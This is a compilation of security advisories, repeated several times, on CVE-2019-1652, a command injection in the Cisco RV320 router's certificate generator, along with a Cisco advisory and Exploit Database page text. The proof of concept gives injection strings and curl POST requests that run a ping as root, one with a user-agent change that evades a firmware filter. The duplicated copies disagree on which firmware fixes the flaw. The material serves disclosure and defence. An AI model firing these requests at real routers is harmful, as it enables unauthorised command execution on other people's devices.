Advisory: Cisco RV320 Command Injection

RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router which
was inadequately patched by the vendor.

Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 through 1.4.2.20
Fixed Versions: none
Vulnerability Type: Remote Code Execution
Security Risk: medium
Vendor URL: <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject>
Vendor Status: working on patch
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2019-005>
Advisory Status: published
CVE: CVE-2019-1652
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652>

Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])

More Details
============

The router's web interface enables users to generate new X.509
certificates directly on the device. Previously, RedTeam Pentesting
identified a vulnerability (rt-sa-2018-004) [2] in this component. By
providing a specially crafted common name, it was possible to inject
shell commands which were subsequently executed on the router as the
root user. This vulnerability was adressed in firmware version 1.4.2.19
published by Cisco [3].

RedTeam Pentesting discovered that the certificate generator in the patched
firmware is still vulnerable. The update adds several filters to handle
single quotes in user input. However, these filters can be evaded by
specially crafted inputs. By providing the following string for the
certificate's common name, a "ping" command can be injected:

------------------------------------------------------------------------
'a$(ping -c 4 192.168.1.2)'b
------------------------------------------------------------------------

Proof of Concept
================

The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device's web interface. The user agent "curl" is
blacklisted by the firmware and must be adjusted in the HTTP client.

------------------------------------------------------------------------
$ curl -s -k -A kurl -X POST -b "$COOKIE" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
"&organization=A&organization_unit=A&email=ab%40example.com"\
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
"SelectSubject_s=1" \
--data-urlencode "common_name='a\$(ping -c 4 192.168.1.2)'b" \
"<https://192.168.1.1/certificate_handle2.htm?type=4">;
------------------------------------------------------------------------

Afterwards, the incoming ICMP echo requests can be observed on the
attacker's system at 192.168.1.2.

Workaround
==========

Prevent untrusted users from using the router's web interface.

Fix
===

None

Security Risk
=============

The vulnerability allows attackers with administrative access to the
router's web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.

## Cisco RV320 Command Injection

RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router.

### Details

* Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
* Affected Versions: 1.4.2.15 and later
* Fixed Versions: since 1.4.2.20
* Vulnerability Type: Remote Code Execution
* Security Risk: medium
* Vendor URL: `https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2018-004`
* Advisory Status: published
* CVE: CVE-2019-1652
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652`

### Introduction

“Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.”
(from the Cisco RV320 product page (<https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html>))

### More Details

The router’s web interface enables users to generate new X.509
certificates directly on the device. A user may enter typical
configuration parameters required for the certificate, such as
organisation, the common name and so on. In order to generate the
certificate, the device uses the command-line program openssl (<https://wiki.openssl.org/index.php/Command_Line_Utilities>). The
device’s firmware uses the following format string to assemble the
openssl command:

```
openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1

```

Although the web interface filters certain special characters via
JavaScript, there is actually no input filtering, escaping or encoding
happening on the server. This allows attackers to inject arbitrary
commands.

### Proof of Concept

Even though all components of the subject seem to be vulnerable to
command injection, the following example uses the common name to trigger
a ping command:

```
a'$(ping -c 4 192.168.1.2)'b

```

The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device’s web interface.

```
curl -s -b "$COOKIE" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
"&organization=A&organization_unit=A&email=ab%40example.com"\
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
"SelectSubject_s=1" \
--data-urlencode "common_name=a'\$(ping -c 4 192.168.1.2)'b" \
"http://192.168.1.1/certificate_handle2.htm?type=4"

```

Afterwards, the incoming ICMP echo requests can be observed on the
attacker’s system at 192.168.1.2.

### Workaround

Prevent untrusted users from using the router’s web interface.

### Fix

Install firmware version 1.4.2.20 (or later) on the router.

### Security Risk

The vulnerability allows attackers with administrative access to the
router’s web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |
| --- |
| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: None C: Low C: High  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: None A: Low A: High  Select Availability Impact Parameters    Base Score: 7.2 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Confirmed  RC: Not Defined   Select Report Confidence Parameters     Temporal Score: 7.2 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: Not Defined  CR: High   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Low  IR: Medium  IR: Not Defined  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: Not Defined  AR: High   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 7.2 |

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**Vulnerable App:**

```
RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router.

Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 and later
Fixed Versions: since 1.4.2.20
Vulnerability Type: Remote Code Execution
Security Risk: medium
Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-004
Advisory Status: published
CVE: CVE-2019-1652
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652

Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])

More Details
============

The router's web interface enables users to generate new X.509
certificates directly on the device. A user may enter typical
configuration parameters required for the certificate, such as
organisation, the common name and so on. In order to generate the
certificate, the device uses the command-line program openssl [2]. The
device's firmware uses the following format string to assemble the
openssl command:

------------------------------------------------------------------------
openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1
------------------------------------------------------------------------

Although the web interface filters certain special characters via
JavaScript, there is actually no input filtering, escaping or encoding
happening on the server. This allows attackers to inject arbitrary
commands.

Proof of Concept
================

Even though all components of the subject seem to be vulnerable to
command injection, the following example uses the common name to trigger
a ping command:

------------------------------------------------------------------------
a'$(ping -c 4 192.168.1.2)'b
------------------------------------------------------------------------

The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device's web interface.

------------------------------------------------------------------------
curl -s -b "$COOKIE" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
"&organization=A&organization_unit=A&email=ab%40example.com"\
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
"SelectSubject_s=1" \
--data-urlencode "common_name=a'\$(ping -c 4 192.168.1.2)'b" \
"http://192.168.1.1/certificate_handle2.htm?type=4"
------------------------------------------------------------------------

Afterwards, the incoming ICMP echo requests can be observed on the
attacker's system at 192.168.1.2.

Workaround
==========

Prevent untrusted users from using the router's web interface.

Fix
===

Install firmware version 1.4.2.20 (or later) on the router.

Security Risk
=============

The vulnerability allows attackers with administrative access to the
router's web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.

| | Cisco Security AdvisoryCisco Small Business RV320 and RV325 Routers Command Injection Vulnerability High   Advisory ID:  cisco-sa-20190123-rv-inject  First Published: 2019 January 23 16:00 GMT  Last Updated:  2019 April 4 14:00 GMT  Version 2.2:  [Final](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#final)   Workarounds:  No workarounds available  Cisco Bug IDs: [CSCvm78058](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvm78058)     CVE-2019-1652     CWE-20       CVSS Score: [Base 7.2](https://sec.cloudapps.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)**Click Icon to Copy Verbose Score** CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X       CVE-2019-1652     CWE-20       [Download CSAF](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject/csaf/cisco-sa-20190123-rv-inject.json)   Email      Summary  * A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker with administrative privileges on an affected device to execute arbitrary commands.  The vulnerability is due to improper validation of user-supplied input. An attacker could exploit this vulnerability by sending malicious HTTP POST requests to the web-based management interface of an affected device. A successful exploit could allow the attacker to execute arbitrary commands on the underlying Linux shell as *root*.  **Update, April 4, 2019:** The initial fix for this   vulnerability was found to be incomplete. The complete fix is now   available in Firmware Release 1.4.2.22.  Firmware updates that address this vulnerability are currently   available. There are no workarounds that address this vulnerability.  This advisory is available at the following link:  Affected Products  * Vulnerable ProductsThis vulnerability affects Cisco Small Business RV320 and RV325 Dual   Gigabit WAN VPN Routers running Firmware Releases 1.4.2.15 through   1.4.2.20.Products Confirmed Not VulnerableOnly products listed in the [Vulnerable Products](https://tvce.cisco.com/security/AIMS/PublicationPreview.aspx?ID=70487&Version=1&Revision=1#vp) section of this advisory are known to be affected by this vulnerability.  Workarounds  * There are no workarounds that address this vulnerability. If the Remote Management feature is enabled, Cisco recommends disabling it to reduce exposure. The feature setting is under **Firewall > General** and is disabled by default. This will disable the web-based management interface on the WAN IP address, which is reachable via the WAN ports. The web-based management interface will continue to be available on the LAN IP address, which is reachable via the LAN ports.  Fixed Software  * Cisco has released free software updates that address the vulnerability described in this advisory. Customers may only install and expect support for software versions and feature sets for which they have purchased a license. By installing, downloading, accessing, or otherwise using such software upgrades, customers agree to follow the terms of the Cisco software license:      <https://www.cisco.com/c/en/us/products/end-user-license-agreement.html>  Additionally, customers may only download software for which they have a valid license, procured from Cisco directly, or through a Cisco authorized reseller or partner. In most cases this will be a maintenance upgrade to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.  When considering software upgrades, customers are advised to regularly consult the advisories for Cisco products, which are available from the [Cisco Security Advisories and Alerts page](https://www.cisco.com/go/psirt), to determine exposure and a complete upgrade solution.  In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.  **Customers Without Service Contracts**  Customers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco TAC:   <https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html>  Customers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade.  **Fixed Releases**  This vulnerability is fixed in RV320 and RV325 Dual Gigabit WAN VPN   Routers Firmware Release 1.4.2.22 and later.  Customers can download the software from the [Software Center](https://software.cisco.com/download/navigator.html) on Cisco.com by doing the following:    1. Click **Browse all**.   2. Navigate to **Routers > Small Business Routers > Small Business RV Series Routers > RV320 Dual Gigabit WAN VPN Router** or **RV325 Dual Gigabit WAN VPN Router > Small Business Router Firmware**.   3. Access releases by using the left pane of the RV320 Dual Gigabit WAN VPN Router or RV325 Dual Gigabit WAN VPN Router page.  Exploitation and Public Announcements  * The Cisco Product Security Incident Response Team (PSIRT) is aware of the existence of public exploit code, as well as active network scanning targeting the vulnerability that is described in this advisory.  Source  * Cisco would like to thank RedTeam Pentesting GmbH for reporting this vulnerability.

## Cisco RV320 Command Injection

RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router which
was inadequately patched by the vendor.

### Details

* Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
* Affected Versions: 1.4.2.15 through 1.4.2.20
* Fixed Versions: 1.4.2.22
* Vulnerability Type: Remote Code Execution
* Security Risk: medium
* Vendor URL: `https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2019-005`
* Advisory Status: published
* CVE: CVE-2019-1652
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652`

### Introduction

“Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.”
(from the Cisco RV320 product page (<https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html>))

### More Details

The router’s web interface enables users to generate new X.509
certificates directly on the device. Previously, RedTeam Pentesting
identified a vulnerability (rt-sa-2018-004) (<https://www.redteam-pentesting.de/advisories/rt-sa-2018-004>) in this component. By
providing a specially crafted common name, it was possible to inject
shell commands which were subsequently executed on the router as the
root user. This vulnerability was adressed in firmware version 1.4.2.19
published by Cisco (<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject>).

RedTeam Pentesting discovered that the certificate generator in the patched
firmware is still vulnerable. The update adds several filters to handle
single quotes in user input. However, these filters can be evaded by
specially crafted inputs. By providing the following string for the
certificate’s common name, a “ping” command can be injected:

```
'a$(ping -c 4 192.168.1.2)'b

```
### Proof of Concept

The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device’s web interface. The user agent “curl” is
blacklisted by the firmware and must be adjusted in the HTTP client.

```
$ curl -s -k -A kurl -X POST -b "$COOKIE" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
"&organization=A&organization_unit=A&email=ab%40example.com"\
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
"SelectSubject_s=1" \
--data-urlencode "common_name='a\$(ping -c 4 192.168.1.2)'b" \
"https://192.168.1.1/certificate_handle2.htm?type=4"

```

Afterwards, the incoming ICMP echo requests can be observed on the
attacker’s system at 192.168.1.2.

### Workaround

Prevent untrusted users from using the router’s web interface.

### Fix

Install firmware version 1.4.2.22 (or later) on the router.

### Security Risk

The vulnerability allows attackers with administrative access to the
router’s web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.
